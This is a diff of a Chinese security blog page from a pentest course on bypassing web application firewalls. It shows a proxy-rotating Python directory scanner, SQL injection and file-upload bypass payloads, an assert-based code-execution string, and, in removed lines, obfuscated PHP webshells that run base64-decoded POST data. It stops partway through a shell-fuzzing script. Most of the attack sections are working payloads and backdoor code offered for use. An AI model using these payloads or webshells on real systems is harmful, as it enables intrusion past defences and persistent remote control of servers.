@@ -24,13 +24,15 @@
 <link rel="stylesheet" href="/css/app.css?v=0.2.5">
 
   
+  <meta name="keywords" content="渗透测试" />
+
 
 <link rel="canonical" href="http://n1h1l157.github.io/2023/07/04/SAFE/7%20waf%E6%94%BB%E9%98%B2/">
 
 
 
   <title>
- |
+XD22 7 Waf 攻防 - 信息安全 |
 Phut Hon = X_T = 天行健，君子以自强不息</title>
 <meta name="generator" content="Hexo 6.3.0"></head>
 <body itemscope itemtype="http://schema.org/WebPage">
@@ -58,23 +60,23 @@ Phut Hon = X_T = 天行健，君子以自强不息</title>
         <div id="brand">
           <div class="pjax">
           
-  <h1 itemprop="name headline">
+  <h1 itemprop="name headline">XD22 7 Waf 攻防
   </h1>
   
 <div class="meta">
-  <span class="item" title="创建时间：2023-07-04 01:47:46">
+  <span class="item" title="创建时间：2023-07-04 00:00:00">
     <span class="icon">
       <i class="ic i-calendar"></i>
     </span>
     <span class="text">发表于</span>
-    <time itemprop="dateCreated datePublished" datetime="2023-07-04T01:47:46+08:00">2023-07-04</time>
+    <time itemprop="dateCreated datePublished" datetime="2023-07-04T00:00:00+08:00">2023-07-04</time>
   </span>
   <span class="item" title="本文字数">
     <span class="icon">
       <i class="ic i-pen"></i>
     </span>
     <span class="text">本文字数</span>
-    <span>5.6k</span>
+    <span>6.1k</span>
     <span class="text">字</span>
   </span>
   <span class="item" title="阅读时长">
@@ -82,7 +84,7 @@ Phut Hon = X_T = 天行健，君子以自强不息</title>
       <i class="ic i-clock"></i>
     </span>
     <span class="text">阅读时长</span>
-    <span>9 分钟</span>
+    <span>10 分钟</span>
   </span>
 </div>
 
@@ -115,12 +117,12 @@ Phut Hon = X_T = 天行健，君子以自强不息</title>
       </div>
       <div id="imgs" class="pjax">
         <ul>
-          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/cbz8yrGvMghk3FY.jpg"></li>
-          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/UlDZRiq3gbE2evh.jpg"></li>
-          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/NxsmFbBQptiHlCW.jpg"></li>
-          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/2fd4OmPLVlHYoaK.jpg"></li>
-          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/YxVAkEwQdF9thjc.jpg"></li>
-          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/eZcPaFH4pt9Cx8k.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/kaZNxKDQWGfuhze.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/wmLsgUnzhOubvFR.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/R6S5zNpXVctWQqT.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/9RqJ7SolMrGZxmj.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/bBgiPja8yQ31ZO2.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/KopmzJq4geNSalr.jpg"></li>
         </ul>
       </div>
     </header>
@@ -145,7 +147,9 @@ Phut Hon = X_T = 天行健，君子以自强不息</title>
     
 <div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
 <i class="ic i-home"></i>
-<span><a href="/">首页</a></span>
+<span><a href="/">首页</a></span><i class="ic i-angle-right"></i>
+<span  class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" itemprop="item" rel="index" title="分类于 信息安全"><span itemprop="name">信息安全</span></a>
+<meta itemprop="position" content="1" /></span>
 </div>
 
     <article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN">
@@ -164,346 +168,121 @@ Phut Hon = X_T = 天行健，君子以自强不息</title>
   <div class="body md" itemprop="articleBody">
     
 
-    <h3 id="71-waf拦截下的信息收集"><a class="markdownIt-Anchor" href="#71-waf拦截下的信息收集">#</a> 7.1 waf 拦截下的信息收集</h3>
-<h4 id="711-信息收集基础知识"><a class="markdownIt-Anchor" href="#711-信息收集基础知识">#</a> 7.1.1 信息收集基础知识</h4>
-<h5 id="1-信息收集常见检测"><a class="markdownIt-Anchor" href="#1-信息收集常见检测">#</a> （ 1 ）信息收集常见检测：</h5>
-<h5 id="脚本或工具速度流量快"><a class="markdownIt-Anchor" href="#脚本或工具速度流量快">#</a> 脚本或工具速度流量快</h5>
-<h5 id="脚本或工具的指纹被识别"><a class="markdownIt-Anchor" href="#脚本或工具的指纹被识别">#</a> 脚本或工具的指纹被识别</h5>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">脚本或工具的检测Payload</span><br></pre></td></tr></table></figure>
-<p>（ 2 ）信息收集常见方法：</p>
-<p>延迟：解决请求过快封 IP 的情况<br>
-代理池：在确保速度的情况下解决请求过快封 IP 的拦截<br>
-白名单：模拟白名单模拟 WAF 授权测试，解决速度及测试拦截，换大型网<br>
-站爬虫 UA<br>
- 模拟用户：模拟真实用户数据包请求探针，解决 WAF 指纹识别</p>
-<p>（ 3 ）被动扫描方式</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">黑暗引擎：Fofa Quake Shodan zoomeye 0.zone等</span><br><span class="line">其他接口：https://forum.ywhack.com/bountytips.php?getinfo</span><br></pre></td></tr></table></figure>
-<h4 id="722-信息收集脚本"><a class="markdownIt-Anchor" href="#722-信息收集脚本">#</a> 7.2.2 信息收集脚本</h4>
-<p>（ 1 ）Python 自定义 header 目录扫描</p>
-<ol>
-<li>
-<p><strong>import</strong> requests</p>
-</li>
-<li>
-<p><strong>import</strong> time</p>
-</li>
-<li></li>
-<li>
-<p>headers={</p>
-</li>
-<li>
-<p>‘Connection’: ‘keep-alive’,</p>
-</li>
-<li>
-<p>‘Cache-Control’: ‘max-age=0’,</p>
-</li>
-<li>
-<p>‘Upgrade-Insecure-Requests’: ‘1’,</p>
-</li>
-<li>
-<p>‘User-<br>
-Agent’: ‘Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, li<br>
-ke Gecko) Chrome/89.0.4389.114 Safari/537.36’,</p>
-</li>
-<li>
-<p>‘Sec-Fetch-Dest’: ‘document’,</p>
-</li>
-<li>
-<p>‘Accept’: ‘text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,<br>
-image/apng,<em>/</em>;q=0.8,application/signed-exchange;v=b3;q=0.9’,</p>
-</li>
-<li>
-<p>‘Sec-Fetch-Site’: ‘none’,</p>
-</li>
-<li>
-<p>‘Sec-Fetch-Mode’: ‘navigate’,</p>
-</li>
-<li>
-<p>‘Sec-Fetch-User’: ‘?1’,</p>
-</li>
-<li>
-<p>‘Accept-Encoding’: ‘gzip, deflate, br’,</p>
-</li>
-<li>
-<p>‘Accept-Language’: ‘zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7’,</p>
-</li>
-<li>
-<p>‘Cookie’: ‘***********************’,</p>
-</li>
-<li>
-<p>}</p>
-</li>
-<li></li>
-<li>
-<p><strong>for</strong> paths <strong>in</strong> open(‘php_b.txt’,encoding=‘utf-8’):</p>
-</li>
-<li>
-<p>url=‘<span class="exturl" data-url="aHR0cDovL3d3dy50ZXN0eGlhb2RpLmZ1bi8=">http://www.testxiaodi.fun/</span>’</p>
-</li>
-<li>
-<p>paths=paths.replace(’\n’,’’)</p>
-</li>
-<li>
-<p>urls=url+paths</p>
-</li>
-<li>
-<p>proxy = {</p>
-</li>
-<li>
-<p>‘http’: ‘<span class="exturl" data-url="aHR0cDovL3RwczY4Ni5rZGxhcGkuY29tOjE1ODE4">tps686.kdlapi.com:15818</span>’,</p>
-</li>
-<li>
-<p>}</p>
-</li>
-<li>
-<p><strong>try</strong> :</p>
-</li>
-<li>
-<p>code=requests.get(urls,headers=headers,proxies=proxy).status_code</p>
-</li>
-<li>
-<p>#req=requests.get(urls, headers=headers, proxies=proxy)</p>
-</li>
-<li>
-<p>#print(urls)</p>
-</li>
-<li>
-<p>#print(req.text)</p>
-</li>
-<li>
-<p>#time.sleep()</p>
-</li>
-<li>
-<p><strong>print</strong> (urls+’|’+str(code))</p>
-</li>
-<li>
-<p><strong>if</strong> code== 200 <strong>or</strong> code== 403 :</p>
-</li>
-<li>
-<p><strong>print</strong> (urls+’|’+str(code))</p>
-</li>
-<li>
-<p><strong>except</strong> Exception as err:</p>
-</li>
-<li>
-<p><strong>print</strong> (‘connecting error’)</p>
-</li>
-<li>
-<p>time.sleep( 3 )</p>
-</li>
-</ol>
-<p>（ 2 ）使用工具代理流量扫描</p>
-<p>通过快代理买一个临时代理设置，可以在 Awvs/Xray/Goby 等工具上直接使用<br>
-代理，或者相关工具需要修改配置文件设置代理，也可以用 proxifier 建立规则，<br>
-代理流量至自己购买的代理，将进程的流量进行中转。<br>
-proxifier 需要设置规则的进程，通过软件的属性定位到文件所在的位置，<br>
-复制文件的可执行程序，或通过任务管理器来找到当前运行的此软件的进程。</p>
-<h3 id="72-waf拦截下的漏洞利用"><a class="markdownIt-Anchor" href="#72-waf拦截下的漏洞利用">#</a> 7.2 waf 拦截下的漏洞利用</h3>
-<h4 id="721-sql注入利用绕过"><a class="markdownIt-Anchor" href="#721-sql注入利用绕过">#</a> 7.2.1 sql 注入利用绕过</h4>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">参考地址：https://www.cnblogs.com/cute-puli/p/11146625.html</span><br></pre></td></tr></table></figure>
-<p>（ 1 ）关键字替换</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.0.100:8081/sqlilabs/Less-2/?id=1 like 1</span><br><span class="line">http://192.168.0.100:8081/sqlilabs/Less-2/?id=1 like 12</span><br></pre></td></tr></table></figure>
-<p>（ 2 ）更换提交方式：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST id=-1 union select 1,2,3--+</span><br></pre></td></tr></table></figure>
-<p>（ 3 ）模拟文件上传 传递数据</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通过burp的右键功能</span><br></pre></td></tr></table></figure>
-<p>（ 4 ）分块传输</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">更改数据请求格式 ：https://github.com/c0ny1/chunked-coding-converter</span><br></pre></td></tr></table></figure>
-<p>（ 5 ）HPP 参数污染</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1/**&amp;id=-1%20union%20select%201,2,3%23*/</span><br></pre></td></tr></table></figure>
-<h4 id="722-文件上传利用绕过"><a class="markdownIt-Anchor" href="#722-文件上传利用绕过">#</a> 7.2.2 文件上传利用绕过</h4>
-<h5 id="1-符号干扰"><a class="markdownIt-Anchor" href="#1-符号干扰">#</a> （ 1 ）符号干扰</h5>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">filename=a.php</span><br><span class="line">filename=&quot;a.php</span><br><span class="line">;filename=&quot;a.php&quot;</span><br></pre></td></tr></table></figure>
-<p>（ 2 ）%00 干扰</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=&quot;a.php%00&quot;</span><br></pre></td></tr></table></figure>
-<p>（ 3 ）垃圾数据溢出</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">无限filename;filename=&quot;a.php&quot;</span><br><span class="line">filename==&quot;a.php&quot;</span><br><span class="line">filename=&quot;name=&#x27;uploadfile.php&quot;</span><br><span class="line">filename=&quot;Content-Disposition: form-data.php&quot;</span><br></pre></td></tr></table></figure>
-<p>（ 4 ）换行解析</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">filename==&quot;a.ph</span><br><span class="line">p&quot;</span><br></pre></td></tr></table></figure>
-<h4 id="723-xss利用绕过"><a class="markdownIt-Anchor" href="#723-xss利用绕过">#</a> 7.2.3 xss 利用绕过</h4>
+    <h3 id="有waf时的信息收集"><a class="markdownIt-Anchor" href="#有waf时的信息收集">#</a> 有 waf 时的信息收集</h3>
+<h4 id="信息收集拦截对抗"><a class="markdownIt-Anchor" href="#信息收集拦截对抗">#</a> 信息收集拦截对抗</h4>
+<ul>
+<li>信息收集常见检测：</li>
+</ul>
+<p>脚本或工具速度流量快</p>
+<p>脚本或工具的指纹被识别</p>
+<p>脚本或工具的检测 Payload</p>
+<ul>
+<li>信息收集常见方法：</li>
+</ul>
+<p>延迟：解决请求过快封 IP 的情况</p>
+<p>代理池：在确保速度的情况下解决请求过快封 IP 的拦截</p>
+<p>白名单：模拟白名单模拟 WAF 授权测试，解决速度及测试拦截，换大型网站爬虫 UA</p>
+<p>模拟用户：模拟真实用户数据包请求探针，解决 WAF 指纹识别</p>
+<ul>
+<li>被动扫描方式</li>
+</ul>
+<p>黑暗引擎：Fofa Quake Shodan zoomeye 0.zone 等</p>
+<p>其他接口：<span class="exturl" data-url="aHR0cHM6Ly9mb3J1bS55d2hhY2suY29tL2JvdW50eXRpcHMucGhwP2dldGluZm8=">https://forum.ywhack.com/bountytips.php?getinfo</span></p>
+<h4 id="信息收集脚本"><a class="markdownIt-Anchor" href="#信息收集脚本">#</a> 信息收集脚本</h4>
+<ul>
+<li>Python 自定义 header 目录扫描</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">目录扫描</span></span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">headers=&#123;</span><br><span class="line">  &#x27;Connection&#x27;: &#x27;keep-alive&#x27;,</span><br><span class="line">  &#x27;Cache-Control&#x27;: &#x27;max-age=0&#x27;,</span><br><span class="line">  &#x27;Upgrade-Insecure-Requests&#x27;: &#x27;1&#x27;,</span><br><span class="line">  &#x27;User-Agent&#x27;: &#x27;Mozilla/0 (Windows NT 0; Win64; x64) AppleWebKit/536 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/536&#x27;,</span><br><span class="line">  &#x27;Sec-Fetch-Dest&#x27;: &#x27;document&#x27;,</span><br><span class="line">  &#x27;Accept&#x27;: &#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&#x27;,</span><br><span class="line">  &#x27;Sec-Fetch-Site&#x27;: &#x27;none&#x27;,</span><br><span class="line">  &#x27;Sec-Fetch-Mode&#x27;: &#x27;navigate&#x27;,</span><br><span class="line">  &#x27;Sec-Fetch-User&#x27;: &#x27;?1&#x27;,</span><br><span class="line">  &#x27;Accept-Encoding&#x27;: &#x27;gzip, deflate, br&#x27;,</span><br><span class="line">  &#x27;Accept-Language&#x27;: &#x27;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&#x27;,</span><br><span class="line">  &#x27;Cookie&#x27;: &#x27;*&#x27;,</span><br><span class="line"> &#125;</span><br><span class="line"> for paths in open(&#x27;php_b.txt&#x27;,encoding=&#x27;utf-8&#x27;):</span><br><span class="line">   url=&#x27;http://www.testxiaodi.fun/&#x27;</span><br><span class="line">   paths=paths.replace(&#x27;\n&#x27;,&#x27;&#x27;)</span><br><span class="line">   urls=url+paths</span><br><span class="line">   proxy = &#123;</span><br><span class="line">     &#x27;http&#x27;: &#x27;tps68kdlapi.com:15818&#x27;,</span><br><span class="line">   &#125;</span><br><span class="line">   try:</span><br><span class="line">     code=requests.get(urls,headers=headers,proxies=proxy).status_code</span><br><span class="line">     print (urls+&#x27;|&#x27;+str(code))</span><br><span class="line">     if code== 200 or code== 403 :</span><br><span class="line">       print (urls+&#x27;|&#x27;+str(code))</span><br><span class="line">   except Exception as err:</span><br><span class="line">     print(&#x27;connecting error&#x27;)</span><br><span class="line">     time.sleep(3)</span><br></pre></td></tr></table></figure>
+<ul>
+<li>使用工具代理流量扫描</li>
+</ul>
+<p>通过快代理买一个临时代理设置，可以在 Awvs/Xray/Goby 等工具上直接使用 代理，或者相关工具需要修改配置文件设置代理，也可以用 proxifier 建立规则， 代理流量至自己购买的代理，将进程的流量进行中转。</p>
+<p>proxifier 需要设置规则的进程，通过软件的属性定位到文件所在的位置， 复制文件的可执行程序，或通过任务管理器来找到当前运行的此软件的进程。</p>
+<h3 id="漏洞利用拦截对抗"><a class="markdownIt-Anchor" href="#漏洞利用拦截对抗">#</a> 漏洞利用拦截对抗</h3>
+<h4 id="sql注入利用绕过"><a class="markdownIt-Anchor" href="#sql注入利用绕过">#</a> sql 注入利用绕过</h4>
+<p>参考地址：<span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vY3V0ZS1wdWxpL3AvMTExNDY2aHRtbA==">https://www.cnblogs.com/cute-puli/p/111466html</span></p>
+<ul>
+<li>关键字替换</li>
+</ul>
+<p><span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMC4xMDA6ODA4MS9zcWxpbGFicy9MZXNzLTIvP2lkPTE=">http://192.168.0.100:8081/sqlilabs/Less-2/?id=1</span> like 1<br>
+<span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMC4xMDA6ODA4MS9zcWxpbGFicy9MZXNzLTIvP2lkPTE=">http://192.168.0.100:8081/sqlilabs/Less-2/?id=1</span> like 12</p>
+<ul>
+<li>更换提交方式：</li>
+</ul>
+<p>POST id=-1 union select 1,2,3–+</p>
+<ul>
+<li>模拟文件上传 传递数据</li>
+</ul>
+<p>通过 burp 的右键功能</p>
+<ul>
+<li>分块传输</li>
+</ul>
+<p>更改数据请求格式 ：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2MwbnkxL2NodW5rZWQtY29kaW5nLWNvbnZlcnRlcg==">https://github.com/c0ny1/chunked-coding-converter</span></p>
+<ul>
+<li>HPP 参数污染</li>
+</ul>
+<p>id=1/&amp;id=-1%20union%20select%201,2,3%23*/</p>
+<h4 id="文件上传拦截绕过"><a class="markdownIt-Anchor" href="#文件上传拦截绕过">#</a> 文件上传拦截绕过</h4>
+<ul>
+<li>符号干扰</li>
+</ul>
+<p>filename=a.php<br>
+filename=&quot;a.php<br>
+;filename=“a.php”</p>
+<ul>
+<li>%00 干扰</li>
+</ul>
+<p>filename=“a.php%00”</p>
+<ul>
+<li>垃圾数据溢出</li>
+</ul>
+<p>无限 filename;filename=“a.php”<br>
+filename==“a.php”<br>
+filename=“name='uploadfile.php”<br>
+filename=“Content-Disposition: form-data.php”</p>
+<ul>
+<li>换行解析</li>
+</ul>
+<p>filename==“<span class="exturl" data-url="aHR0cDovL2EucGg=">a.ph</span><br>
+p”</p>
+<h4 id="xss拦截绕过"><a class="markdownIt-Anchor" href="#xss拦截绕过">#</a> xss 拦截绕过</h4>
 <p>工具链接：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3MwbWQzdi9YU1N0cmlrZQ==">https://github.com/s0md3v/XSStrike</span></p>
-<h5 id="使用方法"><a class="markdownIt-Anchor" href="#使用方法">#</a> 使用方法：</h5>
-<p>python <span class="exturl" data-url="aHR0cDovL3hzc3RyaWtlLnB5">xsstrike.py</span> -u “<span class="exturl" data-url="aHR0cDovL3h4L3hzc19fZ2V0LnBocD9tZXNzYWdlPTEmYW1wOw==">http://xx/xss__get.php?message=1&amp;</span> submit=submit” --proxy</p>
-<h4 id="724-其他绕过"><a class="markdownIt-Anchor" href="#724-其他绕过">#</a> 7.2.4 其他绕过</h4>
-<p>采用参数替换绕过:txt=<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>y</mi><mo>=</mo><mi>s</mi><mi>t</mi><msub><mi>r</mi><mi>r</mi></msub><mi>e</mi><mi>p</mi><mi>l</mi><mi>a</mi><mi>c</mi><mi>e</mi><msup><mo stretchy="false">(</mo><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><msup><mi>x</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><msup><mo separator="true">,</mo><mrow><mo mathvariant="normal">′</mo><mo mathvariant="normal">′</mo></mrow></msup><msup><mo separator="true">,</mo><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mi>p</mi><mi>x</mi><mi>h</mi><mi>p</mi><mi>x</mi><mi>i</mi><mi>n</mi><mi>x</mi><mi>f</mi><mi>o</mi><mo stretchy="false">(</mo><msup><mo stretchy="false">)</mo><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo stretchy="false">)</mo><mo separator="true">;</mo><mi>a</mi><mi>s</mi><mi>s</mi><mi>e</mi><mi>r</mi><mi>t</mi><mo stretchy="false">(</mo></mrow><annotation encoding="application/x-tex">y=str_replace(&#x27;x&#x27;,&#x27;&#x27;,&#x27;pxhpxinxfo()&#x27;);assert(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.001892em;vertical-align:-0.25em;"></span><span class="mord mathnormal">s</span><span class="mord mathnormal">t</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">e</span><span class="mord mathnormal">p</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">a</span><span class="mord mathnormal">c</span><span class="mord mathnormal">e</span><span class="mopen"><span class="mopen">(</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mpunct"><span class="mpunct">,</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mpunct"><span class="mpunct">,</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">p</span><span class="mord mathnormal">x</span><span class="mord mathnormal">h</span><span class="mord mathnormal">p</span><span class="mord mathnormal">x</span><span class="mord mathnormal">i</span><span class="mord mathnormal">n</span><span class="mord mathnormal">x</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">o</span><span class="mopen">(</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mpunct">;</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">a</span><span class="mord mathnormal">s</span><span class="mord mathnormal">s</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">t</span><span class="mopen">(</span></span></span></span>y);&amp;submit<br>
-=%E6%8F%90%E4%BA%A4<br>
- 文件包含使用…\ …/ …\ 等</p>
-<h3 id="73-waf拦截下的权限控制"><a class="markdownIt-Anchor" href="#73-waf拦截下的权限控制">#</a> 7.3 waf 拦截下的权限控制</h3>
-<h4 id="731-php-传参带入"><a class="markdownIt-Anchor" href="#731-php-传参带入">#</a> 7.3.1 php 传参带入</h4>
-<p>（ 1 ）php 木马如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=$_GET[&#x27;a&#x27;];</span><br><span class="line">$aa=$a.&#x27;ert&#x27;;</span><br><span class="line">$aa(base64_decode($_POST[&#x27;x&#x27;]));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>（ 2 ）代码利用：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?a=ass</span><br><span class="line">x=cGhwaW5mbygpOw==</span><br></pre></td></tr></table></figure>
-<h4 id="732-php-变量覆盖"><a class="markdownIt-Anchor" href="#732-php-变量覆盖">#</a> 7.3.2 php 变量覆盖</h4>
-<p>（ 1 ）php 木马如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=&#x27;b&#x27;;</span><br><span class="line">$b=&#x27;assert&#x27;;</span><br><span class="line">$$a(base64_decode($_POST[&#x27;x&#x27;]));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>（ 2 ）代码利用：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x=cGhwaW5mbygpOw==</span><br></pre></td></tr></table></figure>
-<h4 id="733-php-加密变异"><a class="markdownIt-Anchor" href="#733-php-加密变异">#</a> 7.3.3 php 加密变异</h4>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://www.phpjm.net/</span><br><span class="line">https://www.phpjms.com/</span><br><span class="line">http://1.15.155.76:1234/</span><br></pre></td></tr></table></figure>
-<h4 id="734-php-异或运算"><a class="markdownIt-Anchor" href="#734-php-异或运算">#</a> 7.3.4 php 异或运算</h4>
-<ol>
-<li>
-<p><strong>import</strong> requests</p>
-</li>
-<li>
-<p><strong>import</strong> time</p>
-</li>
-<li>
-<p><strong>import</strong> threading,queue</p>
-</li>
-<li></li>
-<li>
-<p><strong>def</strong> string():</p>
-</li>
-<li>
-<p><strong>while not</strong> q.empty():</p>
-</li>
-<li>
-<p>filename=q.get()</p>
-</li>
-<li>
-<p>url = ‘<span class="exturl" data-url="aHR0cDovLzEyNy4wLjAuMTo4MDgxL3gv">http://127.0.0.1:8081/x/</span>’ + filename</p>
-</li>
-<li>
-<p>datas = {</p>
-</li>
-<li>
-<p>‘x’: ‘phpinfo();’</p>
-</li>
-<li>
-<p>}</p>
-</li>
-<li>
-<p>result = requests.post(url, data=datas).content.decode(‘utf-8’)</p>
-</li>
-<li>
-<p><strong>if</strong> ‘XIAODI-PC’ <strong>in</strong> result:</p>
-</li>
-<li>
-<p><strong>print</strong> (‘check-&gt;’+filename+’-&gt;ok’)</p>
-</li>
-<li>
-<p><strong>else</strong> :</p>
-</li>
-<li>
